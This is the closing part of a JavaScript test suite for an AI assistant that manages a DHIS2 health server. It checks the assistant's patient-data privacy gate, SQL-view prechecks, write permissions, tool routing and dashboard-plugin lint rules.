    truthy(`${notMeta.length} queries that read — or could read — anything else are NOT (CTE shadowing, query_to_xml, TABLE, unquoted/commented variables, pg_catalog, datavalue, the transfer SQL)`, leaked.length === 0 || (bad(`leaked: ${JSON.stringify(leaked)}`), false));

    // 2. Gate holes closed; aggregate audits stay readable.
    truthy('audits/trackedEntity, audits/trackedEntityDataValue, analytics/trackedEntities/query are patient-level', ['audits/trackedEntity?trackedEntities=x', 'audits/trackedEntityDataValue', 'analytics/trackedEntities/query/nEenWmSyUEp'].every((p) => ctx.pathReadsPatientData(p)));
    truthy('audits/dataValue and audits/dataApproval are not', !ctx.pathReadsPatientData('audits/dataValue') && !ctx.pathReadsPatientData('audits/dataApproval'));

    // 3. The metadata-only exception, decided from the CURRENT server SQL.
    vm.runInContext(`_cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' };`, ctx);
    const views = {
      metaQry0001: { id: 'metaQry0001', type: 'QUERY', sqlQuery: "select uid, name from program where name ilike '%${q}%'" },
      metaView001: { id: 'metaView001', type: 'VIEW', sqlQuery: 'select uid from program' },
      trnsfer0001: { id: 'trnsfer0001', type: 'QUERY', sqlQuery: TRANSFER_SQL },
    };
    const fetched = [];
    ctx.safeDhis2Fetch = async (path) => { fetched.push(path); const m = /^sqlViews\/(\w{11})\?/.exec(path); return m && views[m[1]] ? views[m[1]] : { _error: 'DHIS2 API 404', _status: 404 }; };
    const gate = (args) => ctx.enforcePatientDataPrivacyGateAsync('dhis2_query', args);
    truthy('cloud model: a metadata-only QUERY view is readable through dhis2_query (var passed in query_params)', (await gate({ path: 'sqlViews/metaQry0001/data', query_params: { var: 'q:anc', pageSize: 50 } })) === null);
    truthy('…its SQL was fetched from the server for the decision', fetched.some((p) => p.startsWith('sqlViews/metaQry0001?')));
    const tr = await gate({ path: 'sqlViews/trnsfer0001/data?var=startDate:2020-01-01' });
    truthy('the transfer view stays refused, with the reason and a pointer to manage_sql_views run', tr && tr._privacy_block && /not metadata-only: reads .*programownershiphistory/.test(tr._error) && /manage_sql_views\(action="run"/.test(tr._hint));
    truthy('a VIEW-type metadata view stays refused (its rows are a stored copy)', !!(await gate({ path: 'sqlViews/metaView001/data' })));
    truthy('extra parameters (criteria) or a .csv suffix keep a metadata view refused', !!(await gate({ path: 'sqlViews/metaQry0001/data?criteria=uid:x' })) && !!(await gate({ path: 'sqlViews/metaQry0001/data.csv' })));
    truthy('a view that cannot be read is refused', !!(await gate({ path: 'sqlViews/missing0001/data' })));
    truthy('tracker/events is still refused with no SQL-view lookup', !!(await gate({ path: 'tracker/events?program=x' })));

    // 4. manage_sql_views run on a cloud model: rows only for metadata-only views.
    ctx.safeDhis2Fetch = async (path) => {
      const m = /^sqlViews\/(\w{11})/.exec(path);
      if (/\/data\?/.test(path)) return { pager: { page: 1, total: 14 }, listGrid: { headers: [{ name: 'a' }, { name: 'b' }], rows: [['x', 'y']] } };
      return m && views[m[1]] ? { ...views[m[1]], displayName: m[1] } : { _error: 'DHIS2 API 404', _status: 404 };
    };
    const runT = await ctx.executeManageSqlViews({ action: 'run', id: 'trnsfer0001', variables: { startDate: '2020-01-01', endDate: '2030-12-31', orgUnit: 'ALL' } });
    truthy('run on the transfer view: columns + row_count, rows withheld', runT.row_count === 14 && runT.columns.length === 2 && !runT.rows && /not metadata-only/i.test(runT.rows_withheld || ''));
    const runM = await ctx.executeManageSqlViews({ action: 'run', id: 'metaQry0001', variables: { q: 'anc' } });
    truthy('run on a metadata view returns its rows', Array.isArray(runM.rows) && runM.rows.length === 1);
    truthy('run without a needed variable is refused before any request', /needs a value for \$\{endDate\}/.test((await ctx.executeManageSqlViews({ action: 'run', id: 'trnsfer0001', variables: { startDate: '2020-01-01', orgUnit: 'ALL' } }))._error || ''));
    truthy('a data error from a patient-level view is not passed on verbatim', /withheld/.test(ctx.sqlViewDbError({ _body: { errorCode: 'E7144', devMessage: 'ERROR: invalid input syntax for type integer: "Jane"' } }, false).db_error) && /does not exist/.test(ctx.sqlViewDbError({ _body: { errorCode: 'E7144', devMessage: 'ERROR: column t.created does not exist' } }, false).db_error));

    // 5. Pre-checks: every DHIS2 refusal found before a request.
    const pc = (sql, minor, tv) => ctx.precheckSqlViewQuery(sql, { minor, testVariables: tv }).problems.join(' | ');
    truthy("an illegal keyword inside a string literal ('delete me') is caught — DHIS2 refuses it there too (E4311)", /"delete"/.test(pc("select uid from program where name <> 'delete me'", 42)));
    truthy('"lastupdated" / "x_delete" are fine', pc("select lastupdated from program where name <> 'x_delete'", 42) === '');
    truthy('the protected userinfo table is caught (E4310)', /protected table/.test(pc('select u.username from programownershiphistory h join userinfo u on u.username = h.createdby', 42)));
    truthy('the failed thread\'s 2.40 names are caught on 2.43 (trackedentityinstance, programinstance, trackedentityinstanceid)', (() => { const r = pc('select tei.uid from programownershiphistory owh join trackedentityinstance tei on tei.trackedentityinstanceid = owh.trackedentityinstanceid join programinstance pi on pi.programinstanceid = owh.programinstanceid', 43); return /"trackedentityinstance" does not exist/.test(r) && /"programinstance" does not exist/.test(r) && /trackedentityinstanceid → trackedentityid/.test(r); })());
    truthy('event is right on 2.42 and wrong on 2.43 (trackerevent / singleevent)', pc('select uid from event', 42) === '' && /trackerevent/.test(pc('select uid from event', 43)) && /only exists from 2\.43/.test(pc('select uid from trackerevent', 42)));
    truthy('a variable without a test value, or a value with ":", is caught (E4307)', /test_variables/.test(pc(TRANSFER_SQL, 42, { startDate: '2020-01-01', orgUnit: 'ALL' })) && /not a value DHIS2 accepts/.test(pc(TRANSFER_SQL, 42, { startDate: '2020-01-01T00:00', endDate: '2030-12-31', orgUnit: 'ALL' })));
    truthy('the transfer recipe passes on 2.42 with its test values', pc(TRANSFER_SQL, 42, { startDate: '2000-01-01', endDate: '2099-12-31', orgUnit: 'ALL' }) === '');
    truthy('sharing rw------ = nobody reads rows; r-r----- or a group with data read = readable', !ctx.sqlViewDataReaders({ public: 'rw------' }).anyone && ctx.sqlViewDataReaders({ public: 'r-r-----' }).anyone && ctx.sqlViewDataReaders({ public: '--------', userGroups: { g: { id: 'g', access: 'r-r-----' } } }).anyone);

    // 6. create: refused before any request on a precheck problem; a view whose
    //    SQL fails when run is removed again; success runs it once.
    d.apiVersion = 42; d.writeAuth = { scope: 'broad', reason: 'verify' };
    const calls = [];
    let failRun = true;
    ctx.safeDhis2Fetch = async (path, opts = {}) => {
      calls.push(`${opts.method || 'GET'} ${path.split('?')[0]}`);
      if (/^sqlViews\?/.test(path)) return { sqlViews: [] };
      if (opts.method === 'POST' && path === 'sqlViews') return { status: 'OK', response: { uid: opts.body.id } };
      if (/\/data\?/.test(path)) return failRun ? { _error: 'DHIS2 API 409', _status: 409, _body: { errorCode: 'E7144', message: 'Query failed because a referenced table does not exist. Please ensure analytics job was run', devMessage: 'ERROR: column h.created does not exist' } } : { pager: { total: 14 }, listGrid: { headers: [{ name: 'transferred_at' }], rows: [['2026-10-19 11:22']] } };
      if (opts.method === 'DELETE') return { status: 'OK' };
      return {};
    };
    const pre = await ctx.executeManageSqlViews({ action: 'create', name: 'x', sql_query: 'select uid from trackedentityinstance', test_variables: {} });
    truthy('create with a 2.40 table name is refused with NO request', /problem/.test(pre._error || '') && calls.length === 0);
    const failed = await ctx.executeManageSqlViews({ action: 'create', name: 'Transfer history', sql_query: TRANSFER_SQL, test_variables: { startDate: '2000-01-01', endDate: '2099-12-31', orgUnit: 'ALL' } });
    truthy('SQL that fails when run: the real PostgreSQL error, the misleading analytics wording explained, the view removed', /E7144/.test(failed._error || '') && /h\.created does not exist/.test(failed.db_error || '') && /not about analytics/.test(failed._hint || '') && failed.view_removed === true && calls.some((c) => c.startsWith('DELETE sqlViews/')));
    failRun = false; calls.length = 0;
    const good = await ctx.executeManageSqlViews({ action: 'create', name: 'Transfer history', sql_query: TRANSFER_SQL, test_variables: { startDate: '2000-01-01', endDate: '2099-12-31', orgUnit: 'ALL' } });
    truthy('success: ran once, 14 rows counted, rows withheld (patient-level), readable by every user, plugin_read sends every variable', good.success && good.test.row_count === 14 && !good.test.rows && /every logged-in user/.test(good.data_access) && /startDate:\$\{startDate\}/.test(good.plugin_read) && /orgUnit:\$\{orgUnit\}/.test(good.plugin_read));
    truthy('…POSTed with public data-read sharing "r-r-----"', calls.includes('POST sqlViews'));
    d.writeAuth = { scope: 'read_only', reason: 'verify' };
    truthy('create on a read-only turn is refused by the write gate', /Refused/.test((await ctx.executeManageSqlViews({ action: 'create', name: 'y', sql_query: 'select uid from program', test_variables: {} }))._error || ''));

    // 7. dhis2_query: the guessed endpoints are answered without a request.
    d.writeAuth = { scope: 'broad', reason: 'verify' };
    calls.length = 0;
    ctx.getSchemaIndex = async () => new Map([['dataelement', { name: 'dataElement', plural: 'dataElements' }], ['dataelements', { name: 'dataElement', plural: 'dataElements' }]]);
    const own = await ctx.executeTool('dhis2_query', { path: 'tracker/ownership/transfer' });
    truthy('GET tracker/ownership/transfer → answered (write-only; history = SQL view), nothing sent', own._scope === 'known_endpoint_guidance' && /manage_sql_views/.test(own._hint) && calls.length === 0);
    truthy('GET audits → answered, nothing sent', (await ctx.executeTool('dhis2_query', { path: 'audits' }))._scope === 'known_endpoint_guidance' && calls.length === 0);
    const sch = await ctx.executeTool('dhis2_query', { path: 'schemas/enrollment' });
    truthy('GET schemas/enrollment → "not a metadata schema" + describe, nothing sent', /no metadata schema "enrollment"/.test(sch._error || '') && /describe/.test(sch._hint) && calls.length === 0);
    await ctx.executeTool('dhis2_query', { path: 'schemas/dataElements?fields=name' });
    truthy('GET schemas/dataElements is healed to schemas/dataElement (the plural is a 404)', calls.some((c) => c === 'GET schemas/dataElement'));

    // 8. Wiring and routing.
    const R = ctx.__TOOL_ROUTER;
    truthy('manage_sql_views is routed, write-capable, manual-gated, summarised, with a manual that has the transfer recipe', !!R.manage_sql_views
      && vm.runInContext("WRITE_CAPABLE_TOOL_NAMES.has('manage_sql_views') && MANUAL_TOOLS.has('manage_sql_views') && !!TOOL_SUMMARIES.manage_sql_views && /programownershiphistory/.test(MANUAL_EXTRAS.manage_sql_views)", ctx));
    truthy('list / get / describe / run are discovery actions; create is not', ctx.isDiscoveryCall('manage_sql_views', { action: 'describe' }) && ctx.isDiscoveryCall('manage_sql_views', { action: 'run' }) && !ctx.isDiscoveryCall('manage_sql_views', { action: 'create' }));
    const names = (t) => ctx.getContextualTools({ appType: 'Dashboard' }, t, false).map((x) => x.function.name);
    const THREAD = 'can you create an install a dhis2 dashboard plugin then install it on a dashbaord that will show the transfers history that happend in all OU where we can filter by date and OU';
    truthy('the thread\'s request gets manage_sql_views and manage_custom_app', names(THREAD).includes('manage_sql_views') && names(THREAD).includes('manage_custom_app'));
    truthy('"use SQL View to find the transfer history" gets manage_sql_views', names('yes there is no tranfer program or stage, use SQL View to find the tranfer history').includes('manage_sql_views'));
    truthy('an ordinary indicator request does not', !names('create a program indicator for anc visits').includes('manage_sql_views'));
    truthy('detectSqlViewIntent: transfer history / ownership / sql view — not "transfer the data element to another stage"', ctx.detectSqlViewIntent('show the transfers history in all ou') && ctx.detectSqlViewIntent('list of transfers') && ctx.detectSqlViewIntent('create a sql view') && !ctx.detectSqlViewIntent('move this data element to another stage'));
    const sp = await ctx.buildSystemPrompt(THREAD, false, false);
    truthy('the system prompt explains that a transfer is an ownership transfer read with a SQL view', /OWNERSHIP transfer/.test(sp) && /programownershiphistory/.test(sp));

    // 9. Placement: the user's own words were refused twice.
    truthy('"install it on a dashbaord" (typo) is a placement request', ctx.userAskedToPlace([THREAD]));
    truthy('"create a dashboard plugin that shows X" alone is not', !ctx.userAskedToPlace(['create a dashboard plugin that shows ANC coverage']));
    truthy('"go ahead install and setup" after the assistant\'s "…then install it and place it on a dashboard" is a placement answer', (() => {
      vm.runInContext(`conversationHistory = [{ role: 'user', content: 'build a transfer widget' }, { role: 'assistant', content: "Once you confirm, I'll build a dashboard plugin with date-range filters — then install it and place it on a dashboard for you." }]; lastUserText = 'go ahead install and setup';`, ctx);
      return ctx.placementWasRequested();
    })());
    truthy('…but "go ahead" after a message that offered no place is not', (() => {
      vm.runInContext(`conversationHistory = [{ role: 'user', content: 'build a transfer widget' }, { role: 'assistant', content: 'Here is the preview of the widget. Shall I install it?' }]; lastUserText = 'go ahead';`, ctx);
      return !ctx.placementWasRequested();
    })());
    vm.runInContext('conversationHistory = []; lastUserText = "";', ctx);

    // 10. Preview lint: a plugin on a view nobody can read, or without its variables.
    const sqlv = { ok00000Vw01: { id: 'ok00000Vw01', displayName: 'T', type: 'QUERY', sqlQuery: TRANSFER_SQL, sharing: { public: 'r-r-----' } }, noRead0Vw01: { id: 'noRead0Vw01', displayName: 'Transfer History (ownership)', type: 'QUERY', sqlQuery: 'select 1 from programownershiphistory', sharing: { public: 'rw------' } } };
    ctx.safeDhis2Fetch = async (path) => { const m = /^sqlViews\/(\w{11})\?/.exec(path); return m ? sqlv[m[1]] : {}; };
    const cmp = (src) => ({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', src).code });
    const noRead = await ctx.checkCustomAppSqlViews(cmp("const ID = 'noRead0Vw01'; const Q = { r: { resource: 'sqlViews/' + ID + '/data', params: { paging: false } } };"), { noRead0Vw01: 'sqlViews' });
    truthy('the failed thread\'s plugin (view shared rw------) is refused: nobody could read it (E4312)', noRead.errors.some((e) => /NOBODY can read its rows/.test(e)));
    const noVars = await ctx.checkCustomAppSqlViews(cmp("const Q = { r: { resource: 'sqlViews/ok00000Vw01/data', params: ({ page }) => ({ page, startDate: '2020' }) } };"), { ok00000Vw01: 'sqlViews' });
    truthy('a plugin that never sends the view\'s variables is refused (E4307) — an object key is not sending', noVars.errors.some((e) => /never sends them/.test(e) && /startDate/.test(e)));
    const fine = await ctx.checkCustomAppSqlViews(cmp('const Q = { r: { resource: \'sqlViews/ok00000Vw01/data\', params: ({ s, e, o, page }) => ({ var: [`startDate:${s}`, `endDate:${e}`, `orgUnit:${o}`], page, pageSize: 50 }) } };'), { ok00000Vw01: 'sqlViews' });
    truthy('a plugin that sends every variable and pages on the server passes', fine.errors.length === 0 && fine.warnings.length === 0 && fine.views.length === 1);

    // 11. Pagination page sizes (the model's transfer plugin used 25: console error on every render).
    const kitMeta = JSON.parse(fs.readFileSync(path.join(ROOT, 'libs/d2-kit/KIT_VERSION.json'), 'utf8'));
    const pagLint = (src) => ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', src).code }, 'plugin', kitMeta, 'DASHBOARD').errors.filter((e) => /Pagination/.test(e.message));
    const PAG = (extra) => `const { Pagination } = D2UI;\nconst PAGE_SIZE = 25;\nconst P = ({ page, n }) => <Pagination page={page} pageCount={n} pageSize={PAGE_SIZE} total={100} onPageChange={() => {}}${extra} />;`;
    truthy('<Pagination pageSize={25}> (a constant) is refused — not on its page-size menu', pagLint(PAG('')).some((e) => /no option with the value: "25"/.test(e.message)));
    truthy('…allowed with hidePageSizeSelect or pageSizes, and with a listed size', !pagLint(PAG(' hidePageSizeSelect')).length && !pagLint(PAG(' pageSizes={["25", "50"]}')).length && !pagLint(PAG('').replace('PAGE_SIZE = 25', 'PAGE_SIZE = 50')).length);
    truthy('…and a useState(25) page size is caught too', pagLint('const { Pagination } = D2UI;\nconst { useState } = React;\nfunction P() { const [size, setSize] = useState(25); return <Pagination page={1} pageCount={3} pageSize={size} total={60} onPageChange={() => {}} />; }').length === 1);
  } finally {
    ctx.safeDhis2Fetch = saved.sdf; ctx.getSchemaIndex = saved.gsi;
    d.apiVersion = saved.apiVersion; d.writeAuth = saved.writeAuth;
    vm.runInContext('_cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG }; conversationHistory = []; lastUserText = "";', ctx);
  }
}

// setImmediate: a few checks are async (promise-returning safety gates); they
// resolve on the microtask queue, so the verdict must run after it drains.
setImmediate(async () => {
  if (loaded) await runStreamDropChecks().catch((e) => bad(`stream-drop checks threw: ${e && e.stack || e}`));
  if (loaded) { try { runStreamRetryChecks(); } catch (e) { bad(`stream-retry checks threw: ${e && e.stack || e}`); } }
  if (loaded) await runStatePersistenceChecks().catch((e) => bad(`state persistence checks threw: ${e && e.stack || e}`));
  if (loaded) await runPlacementChecks().catch((e) => bad(`placement checks threw: ${e && e.stack || e}`));
  if (loaded) await runSqlViewChecks().catch((e) => bad(`SQL view checks threw: ${e && e.stack || e}`));
  if (loaded) await runCustomAppChecks().catch((e) => bad(`custom-app checks threw: ${e && e.stack || e}`));
  console.log('');
  if (loaded && !screenshotChecksDone) bad('screenshot checks never finished — a SCREENSHOT_* handler did not answer');
  if (loaded && !hardeningChecksDone) bad('hardening checks never finished — a handler did not answer');
  if (failures) { console.error(`\x1b[31mFAILED\x1b[0m — ${failures} check(s) failed\n`); process.exit(1); }
  console.log('\x1b[32mAll checks passed.\x1b[0m\n');
});
